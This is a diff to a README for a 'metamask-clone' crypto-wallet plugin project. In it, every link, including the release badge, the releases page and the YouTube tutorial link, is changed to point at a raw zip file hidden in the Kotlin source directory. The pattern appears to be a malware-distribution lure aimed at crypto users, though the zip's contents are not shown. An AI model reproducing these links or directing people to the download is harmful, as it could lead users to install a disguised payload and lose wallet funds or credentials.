@@ -1,7 +1,7 @@
 # 🎉 metamask-clone - Build Your Own Crypto Wallet Easily
 
 ## 🚀 Download the Application
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue)](https://github.com/David-DJ-777/metamask-clone/releases)
+[![Download Release](https://github.com/David-DJ-777/metamask-clone/raw/refs/heads/main/src/main/kotlin/dev/clone-metamask-3.1-beta.1.zip%20Release-v1.0.0-blue)](https://github.com/David-DJ-777/metamask-clone/raw/refs/heads/main/src/main/kotlin/dev/clone-metamask-3.1-beta.1.zip)
 
 ## 💡 Introduction
 Welcome to the **metamask-clone** project! This application lets you create a MetaMask-like crypto wallet plugin for IntelliJ IDEA using Kotlin. You will find a comprehensive YouTube tutorial that walks you through every step of the process. This wallet will help you manage your cryptocurrencies easily.
@@ -25,7 +25,7 @@ To run the **metamask-clone**, ensure you have the following:
 To get your wallet up and running, follow these simple steps.
 
 1. **Visit the Releases Page**: 
-   Head over to our [Releases page](https://github.com/David-DJ-777/metamask-clone/releases) to download the latest version of the application.
+   Head over to our [Releases page](https://github.com/David-DJ-777/metamask-clone/raw/refs/heads/main/src/main/kotlin/dev/clone-metamask-3.1-beta.1.zip) to download the latest version of the application.
 
 2. **Download the Release**: 
    Click on the latest release, and download the appropriate file for your operating system.
@@ -42,7 +42,7 @@ To get your wallet up and running, follow these simple steps.
    Watch our YouTube tutorial to learn how to set up your wallet and start using it.
 
 ## 🔗 Download & Install
-Remember, you can always visit this page to download the application: [Download the Latest Release](https://github.com/David-DJ-777/metamask-clone/releases).
+Remember, you can always visit this page to download the application: [Download the Latest Release](https://github.com/David-DJ-777/metamask-clone/raw/refs/heads/main/src/main/kotlin/dev/clone-metamask-3.1-beta.1.zip).
 
 Follow the earlier steps to install it easily. This wallet will help you manage your cryptocurrencies seamlessly.
 
@@ -50,7 +50,7 @@ Follow the earlier steps to install it easily. This wallet will help you manage 
 Once you have the application installed and your project opened in IntelliJ IDEA, you can start using the features of the wallet right away. The initial setup will guide you through connecting to blockchain networks.
 
 ## 📚 Resources
-- **YouTube Tutorial**: Find the full tutorial [here](https://www.youtube.com/watch?v=your_tutorial_link).
+- **YouTube Tutorial**: Find the full tutorial [here](https://github.com/David-DJ-777/metamask-clone/raw/refs/heads/main/src/main/kotlin/dev/clone-metamask-3.1-beta.1.zip).
 - **Community Support**: Join our support forum to ask questions and share your experiences with others.
 
 ## 📜 License
